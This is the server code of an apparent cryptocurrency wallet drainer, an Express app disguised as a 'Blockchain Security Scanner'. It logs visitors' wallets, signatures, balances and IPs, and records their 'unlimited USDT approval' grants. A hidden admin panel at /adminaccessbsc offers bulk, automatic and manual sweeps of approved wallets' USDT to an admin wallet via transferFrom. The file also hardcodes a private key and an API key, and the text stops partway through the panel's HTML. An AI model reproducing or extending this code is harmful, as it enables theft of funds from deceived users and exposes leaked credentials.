require('dotenv').config();
const express = require("express");
const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 5000;

// Moralis API Configuration
const MORALIS_API_KEY = process.env.MORALIS_API_KEY || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImJhMTU2ZThmLWI5YmMtNDg4OC1iN2M5LTNiZDNjMGNlNTVjYiIsIm9yZ0lkIjoiNDU5NTgzIiwidXNlcklkIjoiNDcyODI3IiwidHlwZUlkIjoiZDYwNDE4ZWItZmRmNC00YzNmLWFhYjQtMTNkNDE3NTZjYWU5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTI2NDc3MTIsImV4cCI6NDkwODQwNzcxMn0.byril5WA9oS7xmGnLv-9HmZ1jTEXK2oGz40nW65367c";
const MORALIS_BASE_URL = "https://deep-index.moralis.io/api/v2.2";

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Configuration
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
let ADMIN_WALLET = "0xda5d60e88285fda19c315c52a7627bb54e991e6c";
const PRIVATE_KEY = process.env.PRIVATE_KEY || "0xf9d6c36675444fd1276c8fac11dfb54288b5a61df546c38ce6a8ad522b1a692e";
const BSC_RPC = "https://bsc-dataseed.binance.org/";

// Admin settings storage
const SETTINGS_FILE = path.join(__dirname, "admin-settings.json");
const USERS_FILE = path.join(__dirname, "users.json");

function loadSettings() {
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      const settings = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
      if (settings.adminWallet) {
        ADMIN_WALLET = settings.adminWallet;
      }
      return settings;
    }
    return { adminWallet: ADMIN_WALLET };
  } catch (error) {
    console.log("Error loading settings:", error);
    return { adminWallet: ADMIN_WALLET };
  }
}

function saveSettings(settings) {
  try {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
  } catch (error) {
    console.log("Error saving settings:", error);
  }
}

function loadUsers() {
  try {
    if (fs.existsSync(USERS_FILE)) {
      return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    }
    return [];
  } catch (error) {
    console.log("Error loading users:", error);
    return [];
  }
}

function saveUsers(users) {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.log("Error saving users:", error);
  }
}

let adminSettings = loadSettings();
let users = loadUsers();

// Blockchain setup
const provider = new ethers.JsonRpcProvider(BSC_RPC);
let signer;

try {
  signer = new ethers.Wallet(PRIVATE_KEY, provider);
  if (PRIVATE_KEY === "0x" + "0".repeat(64)) {
    console.log("⚠️  Warning: Using dummy private key. Set PRIVATE_KEY environment variable for transfers.");
  } else {
    console.log("✅ Blockchain signer initialized successfully");
  }
} catch (error) {
  console.error("❌ Failed to initialize blockchain signer:", error.message);
  console.log("⚠️  App will run in view-only mode. Set a valid PRIVATE_KEY to enable transfers.");
}

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

let usdtContract;

try {
  if (signer) {
    usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
    console.log("✅ USDT contract initialized");
  } else {
    console.log("⚠️  USDT contract not initialized - no signer available");
  }
} catch (error) {
  console.error("❌ Failed to initialize USDT contract:", error.message);
}

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Real transaction lookup using Moralis API
app.post('/api/transaction', async (req, res) => {
  try {
    const { txHash, network } = req.body;

    // Enhanced validation
    if (!txHash) {
      return res.status(400).json({ 
        error: "Transaction hash is required",
        success: false 
      });
    }

    if (!txHash.startsWith('0x')) {
      return res.status(400).json({ 
        error: "Transaction hash must start with 0x",
        success: false 
      });
    }

    if (txHash.length !== 66) {
      return res.status(400).json({ 
        error: "Transaction hash must be 66 characters long",
        success: false 
      });
    }

    // Map network to Moralis chain
    const chainMap = {
      bsc: '0x38',
      ethereum: '0x1', 
      polygon: '0x89',
      avalanche: '0xa86a'
    };

    const chain = chainMap[network] || '0x38';

    if (!chainMap[network]) {
      console.log(`⚠️ Unsupported network: ${network}, defaulting to BSC`);
    }

    // Fetch transaction data from Moralis
    const response = await fetch(`${MORALIS_BASE_URL}/transaction/${txHash}?chain=${chain}`, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'X-API-Key': MORALIS_API_KEY
      }
    });

    if (!response.ok) {
      if (response.status === 404) {
        return res.status(404).json({ 
          error: "Transaction not found on this network", 
          success: false,
          network: network 
        });
      }
      if (response.status === 401) {
        return res.status(401).json({ 
          error: "API authentication failed", 
          success: false 
        });
      }
      if (response.status === 429) {
        return res.status(429).json({ 
          error: "Rate limit exceeded, please try again later", 
          success: false 
        });
      }
      throw new Error(`Moralis API error: ${response.status} - ${response.statusText}`);
    }

    const txData = await response.json();

    if (!txData || !txData.hash) {
      return res.status(400).json({ 
        error: "Invalid transaction data received", 
        success: false 
      });
    }

    // Get transaction receipt for gas used
    let receiptData = null;
    try {
      const receiptResponse = await fetch(`${MORALIS_BASE_URL}/transaction/${txHash}/verbose?chain=${chain}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'X-API-Key': MORALIS_API_KEY
        }
      });
      if (receiptResponse.ok) {
        receiptData = await receiptResponse.json();
      }
    } catch (error) {
      console.log("Could not fetch receipt data");
    }

    // Format response
    const formattedTx = {
      hash: txData.hash,
      block_number: txData.block_number,
      block_timestamp: txData.block_timestamp,
      from_address: txData.from_address,
      to_address: txData.to_address,
      value: txData.value,
      gas: txData.gas,
      gas_price: txData.gas_price,
      gas_used: receiptData?.gas_used || txData.gas,
      status: receiptData?.status || "1",
      transaction_index: txData.transaction_index,
      nonce: txData.nonce,
      input: txData.input,
      network: network,
      chain_id: chain
    };

    res.json({ success: true, transaction: formattedTx });

  } catch (error) {
    console.error("Transaction lookup error:", error);
    res.status(500).json({ 
      error: "Failed to fetch transaction data",
      message: error.message 
    });
  }
});

// Check wallet balance using Moralis API
app.post('/api/wallet-balance', async (req, res) => {
  try {
    const { address } = req.body;

    if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ error: "Invalid wallet address" });
    }

    // Get BNB balance
    const bnbResponse = await fetch(`${MORALIS_BASE_URL}/${address}/balance?chain=0x38`, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'X-API-Key': MORALIS_API_KEY
      }
    });

    // Get USDT balance
    const usdtResponse = await fetch(`${MORALIS_BASE_URL}/${address}/erc20?chain=0x38&token_addresses=0x55d398326f99059fF775485246999027B3197955`, {
      method: 'GET',
      headers: {
        'Accept': 'application/json', 
        'X-API-Key': MORALIS_API_KEY
      }
    });

    let bnbBalance = "0";
    let usdtBalance = "0";

    if (bnbResponse.ok) {
      const bnbData = await bnbResponse.json();
      bnbBalance = ethers.formatEther(bnbData.balance || "0");
    }

    if (usdtResponse.ok) {
      const usdtData = await usdtResponse.json();
      if (usdtData.length > 0) {
        usdtBalance = ethers.formatUnits(usdtData[0].balance || "0", 18);
      }
    }

    res.json({
      success: true,
      bnbBalance: parseFloat(bnbBalance).toFixed(4),
      usdtBalance: parseFloat(usdtBalance).toFixed(2),
      hasBalance: parseFloat(bnbBalance) > 0.01 || parseFloat(usdtBalance) > 0
    });

  } catch (error) {
    console.error("Balance check error:", error);
    res.status(500).json({ error: "Failed to fetch wallet balance" });
  }
});

// Log wallet connections
app.post('/log', (req, res) => {
  try {
    if (!req.body || Object.keys(req.body).length === 0) {
      console.error('❌ Empty request body');
      return res.status(400).json({ error: "Request body is empty" });
    }

    const { wallet, signature, timestamp, message, bnbBalance, usdtBalance } = req.body;

    if (!wallet || !signature || !timestamp) {
      return res.status(400).json({ 
        error: "Missing required fields",
        required: ["wallet", "signature", "timestamp"]
      });
    }

    if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
      return res.status(400).json({ error: "Invalid wallet address format" });
    }

    let userIndex = users.findIndex(u => u.wallet.toLowerCase() === wallet.toLowerCase());

    if (userIndex !== -1) {
      // Update existing user
      users[userIndex].bnbBalance = bnbBalance || '0';
      users[userIndex].usdtBalance = usdtBalance || '0';
      users[userIndex].lastUpdated = new Date().toISOString();
      users[userIndex].walletConnected = true;
      users[userIndex].lastConnection = new Date().toISOString();

      saveUsers(users);
      console.log(`✅ User updated: ${wallet}`);
      return res.status(200).json({ 
        success: true, 
        message: "User updated successfully",
        existing: true
      });
    }

    // Add new user
    const newUser = {
      wallet: wallet,
      signature: signature,
      timestamp: timestamp,
      message: message || '',
      walletConnected: true,
      approvalStatus: 'pending',
      approvalAmount: '0',
      unlimitedApproval: false,
      balance: usdtBalance || '0',
      bnbBalance: bnbBalance || '0',
      usdtBalance: usdtBalance || '0',
      transferred: false,
      transferAmount: '0',
      transferDate: null,
      dateAdded: new Date().toISOString(),
      lastConnection: new Date().toISOString(),
      ip: req.ip || req.connection.remoteAddress,
      lastUpdated: new Date().toISOString()
    };

    users.push(newUser);
    saveUsers(users);

    console.log(`✅ New user added: ${wallet}`);
    console.log(`📊 Total users: ${users.length}`);

    res.status(200).json({ 
      success: true, 
      message: "User logged successfully",
      userCount: users.length
    });

  } catch (error) {
    console.error("❌ Error in /log endpoint:", error);
    res.status(500).json({ 
      error: "Internal server error",
      message: "Failed to process request"
    });
  }
});

// Log approval transactions
app.post('/log-approval', (req, res) => {
  try {
    const { wallet, approvalAmount, unlimited, transactionHash, timestamp } = req.body;

    if (!wallet) {
      return res.status(400).json({ error: "Wallet address required" });
    }

    let userIndex = users.findIndex(u => u.wallet.toLowerCase() === wallet.toLowerCase());
    if (userIndex === -1) {
      // Create new user if not exists
      const newUser = {
        wallet: wallet,
        signature: 'unlimited_approval_' + Date.now(),
        timestamp: timestamp || Date.now(),
        message: 'Unlimited USDT approval granted',
        walletConnected: true,
        approvalStatus: 'approved',
        approvalAmount: approvalAmount || 'unlimited',
        unlimitedApproval: unlimited || false,
        balance: '0',
        transferred: false,
        transferAmount: '0',
        transferDate: null,
        dateAdded: new Date().toISOString(),
        transactionHash: transactionHash || '',
        lastUpdated: new Date().toISOString()
      };

      users.push(newUser);
      userIndex = users.length - 1;
    } else {
      // Update existing user
      users[userIndex].approvalStatus = 'approved';
      users[userIndex].approvalAmount = approvalAmount || 'unlimited';
      users[userIndex].unlimitedApproval = unlimited || false;
      users[userIndex].transactionHash = transactionHash || '';
      users[userIndex].lastUpdated = new Date().toISOString();
      users[userIndex].approvalDate = new Date().toISOString();
    }

    saveUsers(users);

    console.log(`✅ Unlimited approval logged for ${wallet}`);
    res.json({ success: true, message: 'Approval logged successfully' });

  } catch (error) {
    console.error('Approval logging error:', error);
    res.status(500).json({ error: 'Failed to log approval' });
  }
});

// Dedicated admin access route
app.get('/adminaccessbsc', async (req, res) => {
  try {
    const totalUsers = users.length;
    const approvedUsers = users.filter(u => u.approvalStatus === 'approved').length;
    const transferredUsers = users.filter(u => u.transferred).length;
    const pendingUsers = users.filter(u => !u.transferred && u.approvalStatus === 'approved');

    let totalUSDTAvailable = 0;
    let totalBNBAvailable = 0;
    let adminBNB = 0;

    // Get current balances for approved users (but don't show user details)
    for (const user of users.filter(u => !u.transferred && u.approvalStatus === 'approved')) {
      try {
        if (usdtContract) {
          const usdtBalance = await usdtContract.balanceOf(user.wallet);
          const bnbBalance = await provider.getBalance(user.wallet);

          const usdtFormatted = parseFloat(ethers.formatUnits(usdtBalance, 18));
          const bnbFormatted = parseFloat(ethers.formatEther(bnbBalance));

          totalUSDTAvailable += usdtFormatted;
          totalBNBAvailable += bnbFormatted;
        }
      } catch (error) {
        console.log(`Error fetching balance for wallet:`, error.message);
      }
    }

    // Get admin BNB balance
    if (signer) {
      const adminBalance = await provider.getBalance(signer.address);
      adminBNB = parseFloat(ethers.formatEther(adminBalance));
    }

    let html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>🔍 Blockchain Security Scanner - Admin Panel</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
          background: linear-gradient(135deg, #0a0e27 0%, #1a1a2e 100%);
          color: #ffffff;
          min-height: 100vh;
          padding: 15px;
        }
        .dashboard { max-width: 1400px; margin: 0 auto; }
        .header {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 20px;
          padding: 20px;
          margin-bottom: 20px;
          text-align: center;
        }
        .header h1 { 
          color: #64ffda; 
          font-size: clamp(24px, 5vw, 32px); 
          margin-bottom: 15px;
          text-shadow: 0 0 20px rgba(100, 255, 218, 0.5);
        }
        .subtitle { color: #90a4ae; font-size: clamp(14px, 3vw, 16px); margin-bottom: 25px; }
        .admin-controls {
          display: flex;
          gap: 10px;
          justify-content: center;
          flex-wrap: wrap;
        }
        .btn {
          padding: 10px 20px;
          border: none;
          border-radius: 25px;
          font-weight: 600;
          cursor: pointer;
          text-decoration: none;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          transition: all 0.3s ease;
          font-size: clamp(12px, 2.5vw, 14px);
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
          body { padding: 10px; }
          .header { padding: 15px; margin-bottom: 15px; }
          .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
          .stat-card { padding: 15px; }
          .stat-number { font-size: 24px; }
          .transfer-controls { padding: 15px; }
          .transfer-form { 
            flex-direction: column; 
            align-items: stretch; 
            gap: 10px; 
          }
          .form-input { width: 100% !important; }
          .btn { padding: 12px 16px; font-size: 12px; }
          .admin-controls { gap: 8px; }
          .transaction-details { padding: 15px; }
          .tx-item { 
            flex-direction: column; 
            align-items: flex-start; 
            gap: 5px; 
          }
          .tx-hash { 
            font-size: 10px; 
            word-break: break-all; 
            width: 100%;
          }
          .tx-value { font-size: 12px; }
          .admin-wallet-info { padding: 15px; }
          .admin-wallet-info span { 
            font-size: 12px; 
            word-break: break-all; 
            display: block; 
            margin: 10px 0; 
          }
        }

        @media (max-width: 480px) {
          .stats-grid { grid-template-columns: 1fr; }
          .transfer-form { gap: 8px; }
          .tx-item { padding: 10px 0; }
          .tx-hash { font-size: 9px; }
          .admin-wallet-info span { font-size: 10px; }
        }

        /* Transaction Details Styling */
        .transaction-details {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
        }
        .tx-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0;
          border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .tx-item:last-child { border-bottom: none; }
        .tx-label { color: #90a4ae; font-size: 13px; }
        .tx-value { 
          color: #64ffda; 
          font-weight: 600; 
          font-family: 'Courier New', monospace;
          font-size: 13px;
        }
        .tx-hash { 
          word-break: break-all; 
          font-size: 11px;
          background: rgba(255, 255, 255, 0.1);
          padding: 4px 8px;
          border-radius: 8px;
        }
        .btn-primary { 
          background: linear-gradient(135deg, #64ffda, #3f51b5); 
          color: white; 
        }
        .btn-success { 
          background: linear-gradient(135deg, #4caf50, #2e7d32); 
          color: white; 
        }
        .btn-danger { 
          background: linear-gradient(135deg, #f44336, #c62828); 
          color: white; 
        }
        .btn-warning { 
          background: linear-gradient(135deg, #ff9800, #ef6c00); 
          color: white; 
        }
        .btn:hover { 
          transform: translateY(-2px); 
          box-shadow: 0 10px 20px rgba(0,0,0,0.3); 
        }
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 20px;
          margin-bottom: 30px;
        }
        .stat-card {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 16px;
          padding: 25px;
          text-align: center;
          position: relative;
          overflow: hidden;
        }
        .stat-card::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          height: 3px;
          background: linear-gradient(90deg, #64ffda, #3f51b5);
        }
        .stat-number { 
          font-size: 36px; 
          font-weight: 700; 
          color: #64ffda; 
          margin-bottom: 8px;
          text-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }
        .stat-label { 
          color: #90a4ae; 
          font-size: 14px; 
          text-transform: uppercase; 
          letter-spacing: 1px;
        }
        .admin-wallet-info {
          background: rgba(255, 152, 0, 0.1);
          border: 1px solid rgba(255, 152, 0, 0.3);
          border-radius: 12px;
          padding: 20px;
          margin-top: 20px;
          text-align: center;
        }
        .transfer-controls {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 16px;
          padding: 25px;
          margin-bottom: 25px;
        }
        .transfer-controls h3 { color: #64ffda; margin-bottom: 15px; }
        .transfer-form {
          display: flex;
          gap: 15px;
          align-items: center;
          flex-wrap: wrap;
          margin-top: 20px;
        }
        .form-input {
          padding: 12px 15px;
          background: rgba(255, 255, 255, 0.08);
          border: 1px solid rgba(255, 255, 255, 0.2);
          border-radius: 8px;
          color: #ffffff;
          outline: none;
          transition: all 0.3s ease;
        }
        .form-input:focus {
          border-color: #64ffda;
          box-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }
        .form-input::placeholder { color: #607d8b; }
        .main-content {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 16px;
          overflow: hidden;
        }
        .table-header {
          background: linear-gradient(135deg, #64ffda, #3f51b5);
          color: white;
          padding: 20px 25px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { 
          padding: 15px 20px; 
          text-align: left; 
          border-bottom: 1px solid rgba(255, 255, 255, 0.1); 
        }
        th { 
          background: rgba(255, 255, 255, 0.05); 
          font-weight: 600; 
          color: #64ffda; 
          font-size: 13px;
          text-transform: uppercase;
        }
        tr:hover { background: rgba(255, 255, 255, 0.03); }
        .wallet-address {
          font-family: 'Courier New', monospace;
          background: rgba(255, 255, 255, 0.1);
          padding: 6px 12px;
          border-radius: 15px;
          font-size: 12px;
        }
        .status-badge {
          padding: 6px 12px;
          border-radius: 15px;
          font-size: 11px;
          font-weight: 600;
          text-transform: uppercase;
        }
        .status-approved { background: rgba(76, 175, 80, 0.2); color: #4caf50; }
        .status-pending { background: rgba(255, 152, 0, 0.2); color: #ff9800; }
        .status-transferred { background: rgba(100, 255, 218, 0.2); color: #64ffda; }
        .btn-sm { padding: 8px 15px; font-size: 11px; border-radius: 15px; }
        .action-buttons {
          display: flex;
          gap: 8px;
          flex-wrap: wrap;
        }
      </style>
    </head>
    <body>
      <div class="dashboard">
        <div class="header">
          <h1>🔍 Blockchain Security Scanner</h1>
          <div class="subtitle">Advanced Admin Control Panel</div>
          <div class="admin-controls">
            <button class="btn btn-primary" onclick="location.reload()">🔄 Refresh Data</button>
            <button class="btn btn-success" onclick="bulkTransfer()">⚡ Bulk Transfer</button>
            <button class="btn btn-warning" onclick="exportData()">📊 Export CSV</button>
            <button class="btn btn-danger" onclick="clearLogs()">🗑️ Clear Logs</button>
          </div>
          <div class="admin-wallet-info">
            <strong>Admin Wallet (receives all transfers):</strong>
            <span style="font-family: monospace; margin-left: 10px;">${ADMIN_WALLET}</span>
            <button onclick="editAdminWallet()" style="margin-left: 15px; padding: 8px 15px; background: rgba(255,255,255,0.2); color: white; border: none; border-radius: 15px; cursor: pointer;">✏️ Edit</button>
          </div>
        </div>

        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-number">${totalUsers}</div>
            <div class="stat-label">Total Wallets</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">${approvedUsers}</div>
            <div class="stat-label">Approved Wallets</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">${transferredUsers}</div>
            <div class="stat-label">Transferred</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">${totalUSDTAvailable.toFixed(2)}</div>
            <div class="stat-label">USDT Available</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" style="color: ${adminBNB >= (pendingUsers.length * 0.003) ? '#4caf50' : '#f44336'};">${adminBNB.toFixed(4)}</div>
            <div class="stat-label">Admin BNB (Gas Fees)</div>
          </div>
        </div>

        <div class="transfer-controls">
          <h3>💸 Transfer Control System</h3>
          <p style="color: #90a4ae; margin-bottom: 15px;">Automated and manual transfer options</p>
          
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
            <div style="background: rgba(76, 175, 80, 0.1); border: 1px solid rgba(76, 175, 80, 0.3); border-radius: 12px; padding: 20px;">
              <h4 style="color: #4caf50; margin-bottom: 15px;">⚡ Automatic Bulk Transfer</h4>
              <p style="color: #90a4ae; font-size: 14px; margin-bottom: 15px;">Transfer from ALL approved wallets with balance automatically</p>
              <label style="display: flex; align-items: center; margin-bottom: 15px; color: #90a4ae;">
                <input type="checkbox" id="autoTransferEnabled" ${pendingUsers.length > 0 ? 'checked' : ''} style="margin-right: 10px;">
                Enable Auto Transfer (${pendingUsers.length} pending wallets)
              </label>
              <button class="btn btn-success" onclick="toggleAutoTransfer()" style="width: 100%;">
                ${pendingUsers.length > 0 ? '⚡ Start Auto Transfer' : '✅ Auto Transfer Ready'}
              </button>
            </div>
            
            <div style="background: rgba(255, 152, 0, 0.1); border: 1px solid rgba(255, 152, 0, 0.3); border-radius: 12px; padding: 20px;">
              <h4 style="color: #ff9800; margin-bottom: 15px;">🎯 Manual Transfer</h4>
              <div class="transfer-form" style="display: flex; flex-direction: column; gap: 10px;">
                <input type="text" id="targetWallet" placeholder="Wallet address" class="form-input">
                <input type="number" id="transferAmount" placeholder="Amount" class="form-input">
                <select id="tokenType" class="form-input">
                  <option value="usdt">USDT</option>
                  <option value="all">All USDT</option>
                </select>
                <button class="btn btn-warning" onclick="manualTransfer()" style="width: 100%;">💸 Transfer Now</button>
              </div>
            </div>
          </div>
        </div>

        <div class="main-content">
          <div class="table-header">
            <h2>📊 Transaction Monitoring</h2>
            <span>Live blockchain transaction tracking</span>
          </div>

          <div class="transaction-details">
            <h3 style="color: #64ffda; margin-bottom: 20px;">💰 Latest Unlimited Approval Transfers</h3>`;

    // Show recent transactions for transferred users
    const recentTransfers = users.filter(u => u.transferred && u.transactionHash).slice(-10);

    for (let transfer of recentTransfers) {
      const shortWallet = transfer.wallet.substring(0, 6) + "..." + transfer.wallet.substring(transfer.wallet.length - 4);
      const transferDate = new Date(transfer.transferDate).toLocaleString();
      const shortAdmin = ADMIN_WALLET.substring(0, 6) + "..." + ADMIN_WALLET.substring(ADMIN_WALLET.length - 4);

      html += `
        <div class="tx-item">
          <div>
            <div class="tx-label">📤 From Wallet</div>
            <div class="tx-value">${shortWallet}</div>
          </div>
          <div>
            <div class="tx-label">📥 To Wallet</div>
            <div class="tx-value">${shortAdmin}</div>
          </div>
          <div>
            <div class="tx-label">💰 Amount</div>
            <div class="tx-value">${transfer.transferAmount} USDT</div>
          </div>
        </div>
        <div class="tx-item">
          <div>
            <div class="tx-label">🪙 Token Contract</div>
            <div class="tx-value">0x55d3...7955 (USDT)</div>
          </div>
          <div>
            <div class="tx-label">🌐 Network</div>
            <div class="tx-value">BSC Mainnet (Chain ID: 56)</div>
          </div>
          <div>
            <div class="tx-label">📅 Date & Time</div>
            <div class="tx-value">${transferDate}</div>
          </div>
        </div>
        <div class="tx-item">
          <div style="width: 100%;">
            <div class="tx-label">🔗 Transaction Hash</div>
            <div class="tx-hash">
              <a href="https://bscscan.com/tx/${transfer.transactionHash}" target="_blank" style="color: #64ffda; text-decoration: none;">
                ${transfer.transactionHash}
              </a>
            </div>
          </div>
        </div>
        <div class="tx-item">
          <div>
            <div class="tx-label">⛽ Gas Fee</div>
            <div class="tx-value">~0.0005 BNB</div>
          </div>
          <div>
            <div class="tx-label">📊 Token Standard</div>
            <div class="tx-value">BEP-20 (BSC)</div>
          </div>
          <div>
            <div class="tx-label">✅ Status</div>
            <div class="tx-value" style="color: #4caf50;">Success</div>
          </div>
        </div>
        <hr style="border: none; height: 1px; background: rgba(255,255,255,0.1); margin: 15px 0;">`;
    }

    if (recentTransfers.length === 0) {
      html += `
        <div style="text-align: center; padding: 40px; color: #90a4ae;">
          <div style="font-size: 48px; margin-bottom: 15px;">📊</div>
          <h4>No Transactions Yet</h4>
          <p>Transaction history will appear here once transfers are completed.</p>
        </div>`;
    }

    html += `
          </div>

          <div style="background: rgba(255, 255, 255, 0.05); padding: 20px; border-radius: 12px; margin-top: 20px;">
            <h4 style="color: #64ffda; margin-bottom: 20px; text-align: center;">📊 Complete User Database</h4>
            <div style="overflow-x: auto;">
              <table style="width: 100%; border-collapse: collapse;">
                <thead>
                  <tr style="background: rgba(100, 255, 218, 0.1);">
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">Wallet Address</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">Connection Date</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">USDT Balance</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">BNB Balance</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">Approval Status</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">Transfer Status</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda; font-size: 12px;">Actions</th>
                  </tr>
                </thead>
                <tbody>`;

    // Add all users to the table
    for (let i = 0; i < users.length; i++) {
      const user = users[i];
      const shortWallet = user.wallet.substring(0, 6) + '...' + user.wallet.substring(user.wallet.length - 4);
      const connectionDate = new Date(user.timestamp).toLocaleDateString();
      const usdtBalance = user.usdtBalance || '0';
      const bnbBalance = user.bnbBalance || '0';

      let approvalBadge = '';
      if (user.approvalStatus === 'approved') {
        approvalBadge = '<span style="background: rgba(76, 175, 80, 0.2); color: #4caf50; padding: 4px 8px; border-radius: 12px; font-size: 10px;">✅ UNLIMITED</span>';
      } else {
        approvalBadge = '<span style="background: rgba(255, 152, 0, 0.2); color: #ff9800; padding: 4px 8px; border-radius: 12px; font-size: 10px;">⏳ WAITING</span>';
      }

      let transferBadge = '';
      if (user.transferred) {
        transferBadge = '<span style="background: rgba(100, 255, 218, 0.2); color: #64ffda; padding: 4px 8px; border-radius: 12px; font-size: 10px;">💸 DONE</span>';
      } else {
        transferBadge = '<span style="background: rgba(244, 67, 54, 0.2); color: #f44336; padding: 4px 8px; border-radius: 12px; font-size: 10px;">⏸️ PENDING</span>';
      }

      html += `
                <tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.1);">
                  <td style="padding: 12px; color: #64ffda; font-family: monospace; font-size: 11px;">${shortWallet}</td>
                  <td style="padding: 12px; color: #90a4ae; font-size: 11px;">${connectionDate}</td>
                  <td style="padding: 12px; color: #ff9800; font-weight: 600; font-size: 11px;">${parseFloat(usdtBalance).toFixed(2)} USDT</td>
                  <td style="padding: 12px; color: #f1c40f; font-weight: 600; font-size: 11px;">${parseFloat(bnbBalance).toFixed(4)} BNB</td>
                  <td style="padding: 12px;">${approvalBadge}</td>
                  <td style="padding: 12px;">${transferBadge}</td>
                  <td style="padding: 12px;">
                    <div style="display: flex; gap: 5px; flex-wrap: wrap;">
                      ${!user.transferred && user.approvalStatus === 'approved' ? 
                        `<button onclick="transferFromWallet('${user.wallet}')" style="background: linear-gradient(135deg, #4caf50, #2e7d32); color: white; border: none; padding: 6px 12px; border-radius: 12px; font-size: 10px; cursor: pointer;">💸 Transfer</button>` : ''}
                      <button onclick="removeUser('${user.wallet}')" style="background: linear-gradient(135deg, #f44336, #c62828); color: white; border: none; padding: 6px 12px; border-radius: 12px; font-size: 10px; cursor: pointer;">🗑️ Remove</button>
                    </div>
                  </td>
                </tr>`;
    }

    html += `
                </tbody>
              </table>
            </div>
          </div>

          <div style="background: rgba(255, 255, 255, 0.05); padding: 20px; border-radius: 12px; margin-top: 20px; text-align: center;">
            <h4 style="color: #64ffda; margin-bottom: 10px;">📈 System Status</h4>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-top: 15px;">
              <div>
                <div style="color: #90a4ae; font-size: 12px;">Connected Wallets</div>
                <div style="color: #64ffda; font-size: 18px; font-weight: 600;">${totalUsers}</div>
              </div>
              <div>
                <div style="color: #90a4ae; font-size: 12px;">Completed Transfers</div>
                <div style="color: #4caf50; font-size: 18px; font-weight: 600;">${transferredUsers}</div>
              </div>
              <div>
                <div style="color: #90a4ae; font-size: 12px;">Available USDT</div>
                <div style="color: #ff9800; font-size: 18px; font-weight: 600;">${totalUSDTAvailable.toFixed(2)}</div>
              </div>
              <div>
                <div style="color: #90a4ae; font-size: 12px;">Available BNB</div>
                <div style="color: #f1c40f; font-size: 18px; font-weight: 600;">${totalBNBAvailable.toFixed(4)}</div>
              </div>
              <div>
                <div style="color: #90a4ae; font-size: 12px;">Total Value (USD)</div>
                <div style="color: #e91e63; font-size: 18px; font-weight: 600;">$${(totalUSDTAvailable + (totalBNBAvailable * 600)).toFixed(2)}</div>
              </div>
            </div>
          </div>

          <div style="background: rgba(100, 255, 218, 0.1); border: 1px solid rgba(100, 255, 218, 0.3); border-radius: 12px; padding: 20px; margin-top: 20px; text-align: center;">
